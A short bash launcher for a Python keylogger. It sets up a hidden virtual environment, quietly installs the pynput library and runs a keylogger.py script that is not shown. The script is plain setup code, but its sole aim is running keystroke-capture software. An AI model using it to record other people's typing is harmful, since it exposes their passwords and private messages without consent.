#!/bin/bash
# Portable keylogger launcher - handles venv auto-setup on externally-managed systems

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
VENV_DIR="$SCRIPT_DIR/.kl_env"
KEYLOGGER="$SCRIPT_DIR/keylogger.py"

# Check if pynput is available in system Python
if python3 -c "import pynput" 2>/dev/null; then
    # System has pynput, run directly
    exec python3 "$KEYLOGGER" "$@"
fi

# If not, create/use venv
if [ ! -d "$VENV_DIR" ]; then
    echo "[Setup] Creating virtual environment..." >&2
    python3 -m venv "$VENV_DIR" || {
        echo "[Error] Failed to create venv. Install python3-venv or use: sudo apt install python3-pynput" >&2
        exit 1
    }
fi

# Activate and ensure pynput is installed
source "$VENV_DIR/bin/activate"
if ! python -c "import pynput" 2>/dev/null; then
    echo "[Setup] Installing pynput in venv..." >&2
    pip install --quiet pynput || {
        echo "[Error] Failed to install pynput" >&2
        exit 1
    }
fi

# Run keylogger
exec python "$KEYLOGGER" "$@"
